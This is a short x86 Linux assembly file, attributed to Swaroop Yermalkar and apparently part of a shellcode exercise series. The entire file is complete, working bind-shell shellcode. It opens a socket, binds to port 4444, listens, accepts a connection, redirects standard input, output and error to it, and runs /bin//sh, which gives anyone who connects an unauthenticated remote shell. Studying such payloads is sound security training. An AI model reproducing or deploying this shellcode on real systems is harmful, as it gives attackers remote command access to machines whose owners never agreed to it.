;Swaroop Yermalkar
;bind_shell

global _start
section .text
_start:

xor ebx,ebx
mul ebx



;sockfd = socket(AF_INET, SOCK_STREAM, 0);
mov al,102 
push ebx
inc ebx
push ebx  
push byte 0x2 
mov ecx, esp 
int 0x80 

mov esi, eax 

;Here comes our bind(sockfd, (struct sockaddr *)&host_addr, sizeof(struct sockaddr))  instruction
mov al,102 
mov bl,2   
push edx 
push word 0x5c11 
push word bx
mov ecx, esp 
push byte 0x10
push ecx 
push esi 
mov ecx, esp 
int 0x80

;listen(sockfd, 4);
mov al,102
mov bl,4 
push ebx 
push esi 
mov ecx,esp 
int 0x80

;accept(sockfd, (struct sockaddr *)&client_addr, &sin_size);
mov al,102
mov bl,5
push edx
push edx 
push esi
mov ecx, esp 
int 0x80

 
  xchg eax, ebx     
  push BYTE 0x2     
  pop ecx
dup_loop:
  mov BYTE al, 0x3F ; dup2  syscall #63
  int 0x80          ; dup2(c, 0)
  dec ecx           ; count down to 0
  jns dup_loop      ; If the sign flag is not set, ecx is not negative.

;call execve as we have done before
xor eax,eax

push eax

push 0x68732f6e
push 0x69622f2f

mov ebx,esp

push eax
mov ecx,esp

push ebx
mov edx,esp

mov al,11
int 0x80